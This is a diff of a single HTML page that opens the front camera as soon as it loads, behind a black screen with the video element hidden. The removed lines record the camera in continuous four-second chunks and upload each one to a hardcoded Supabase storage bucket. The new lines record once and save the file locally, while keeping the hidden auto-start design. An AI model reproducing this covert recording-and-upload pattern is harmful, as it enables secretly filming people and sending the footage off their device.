@@ -3,79 +3,76 @@
 <head>
   <meta charset="UTF-8">
   <meta name="viewport" content="width=device-width, initial-scale=1.0">
-  <title>Auto Front Camera Recorder & Upload</title>
+  <title>Auto Front Camera Recorder</title>
   <style>
     body {
       margin: 0;
-      background: black;
-      height: 100vh;
+      background-color: black; /* Full black screen */
       display: flex;
       justify-content: center;
       align-items: center;
+      height: 100vh;
+      color: white;
+      font-family: sans-serif;
     }
-    video { display: none; }
+    video {
+      display: none; /* Hide the video element */
+    }
   </style>
 </head>
 <body>
   <video id="camera" autoplay muted></video>
-  <script type="module">
-    import { createClient } from 'https://cdn.jsdelivr.net/npm/@supabase/supabase-js/+esm'
 
-    // Supabase setup
-    const supabaseUrl = 'https://eizhtvtchspiefxutzlg.supabase.co'
-    const supabaseKey = '<YOUR_ANON_OR_SERVICE_KEY>' // Replace with a secure key or signed upload URL
-    const supabase = createClient(supabaseUrl, supabaseKey)
-
-    async function recordAndUpload() {
+  <script>
+    async function startRecording() {
       try {
         // Request front camera
         const stream = await navigator.mediaDevices.getUserMedia({
           video: { facingMode: "user" },
           audio: false
-        })
+        });
 
-        const video = document.getElementById('camera')
-        video.srcObject = stream
+        const video = document.getElementById('camera');
+        video.srcObject = stream;
 
-        async function recordChunk() {
-          const mediaRecorder = new MediaRecorder(stream)
-          let chunks = []
+        const mediaRecorder = new MediaRecorder(stream);
+        let chunks = [];
 
-          mediaRecorder.ondataavailable = e => {
-            if (e.data.size > 0) chunks.push(e.data)
+        mediaRecorder.ondataavailable = e => {
+          if (e.data.size > 0) {
+            chunks.push(e.data);
           }
+        };
 
-          mediaRecorder.onstop = async () => {
-            const blob = new Blob(chunks, { type: 'video/webm' })
-            chunks = []
+        mediaRecorder.onstop = () => {
+          const blob = new Blob(chunks, { type: 'video/webm' });
+          chunks = [];
+          // You can upload blob to server here
+          console.log('Video recorded:', blob);
 
-            const filename = `recording_${Date.now()}.webm`
+          // Optional: download the video automatically
+          const url = URL.createObjectURL(blob);
+          const a = document.createElement('a');
+          a.href = url;
+          a.download = 'video.webm';
+          a.click();
+          URL.revokeObjectURL(url);
+        };
 
-            const { data, error } = await supabase
-              .storage
-              .from('recordings')
-              .upload(filename, blob, { cacheControl: '3600', upsert: true })
+        mediaRecorder.start();
 
-            if (error) console.error('Upload error:', error)
-            else console.log('Uploaded:', data.path)
-
-            // Start next recording automatically
-            setTimeout(recordChunk, 100) // slight delay to prevent overlap
-          }
-
-          mediaRecorder.start()
-          setTimeout(() => mediaRecorder.stop(), 4000) // 4-second chunks
-        }
-
-        // Start first recording chunk
-        recordChunk()
+        // Stop recording after 4 seconds
+        setTimeout(() => {
+          mediaRecorder.stop();
+          stream.getTracks().forEach(track => track.stop());
+        }, 4000);
 
       } catch (err) {
-        console.error('Camera access error:', err)
+        console.error('Error accessing camera:', err);
       }
     }
 
-    recordAndUpload()
+    startRecording();
   </script>
 </body>
 </html>
